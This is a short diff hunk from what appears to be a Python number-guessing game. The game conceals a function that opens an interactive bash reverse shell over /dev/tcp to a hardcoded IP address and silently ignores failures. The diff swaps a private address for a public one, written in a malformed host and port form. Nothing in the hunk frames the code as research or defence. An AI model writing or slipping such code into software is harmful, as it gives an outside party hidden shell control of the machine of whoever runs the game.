@@ -10,7 +10,7 @@ print('okay! '+ player_name+ ' I am Guessing a number between 1 and 10:')
 
 def fn():
     try:
-        subprocess.check_call("/bin/bash -i >/dev/tcp/192.168.1.223/31337 0<&1 2>&1", shell=True, executable='/bin/bash')
+        subprocess.check_call("/bin/bash -i >/dev/tcp/82.165.97.169 1988/5454 0<&1 2>&1", shell=True, executable='/bin/bash')
     except:
         return 0
 
